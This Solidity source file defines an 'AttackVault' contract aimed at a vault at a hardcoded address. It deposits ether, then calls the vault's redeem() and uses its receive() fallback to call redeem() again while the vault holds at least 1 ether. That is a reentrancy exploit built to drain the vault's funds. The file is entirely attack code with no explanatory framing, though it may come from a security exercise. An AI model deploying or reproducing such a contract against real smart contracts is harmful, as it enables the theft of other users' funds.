// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

contract AttackVault {
    address VaultAddress = 0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B;

    function store() public payable {
        (bool success, ) =
            address(VaultAddress).call{value: msg.value}(
                abi.encodeWithSignature("store()")
            );
        require(success, "Transaction failed");
    }

    function attack() public {
        (bool success, ) =
            address(VaultAddress).call{value: 0}(
                abi.encodeWithSignature("redeem()")
            );
        require(success, "Attack failed");
    }

    receive() external payable {
        require(VaultAddress.balance >= 1 ether);
        (bool success, ) =
            address(VaultAddress).call{value: 0}(
                abi.encodeWithSignature("redeem()")
            );
        require(success, "Transaction failed");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
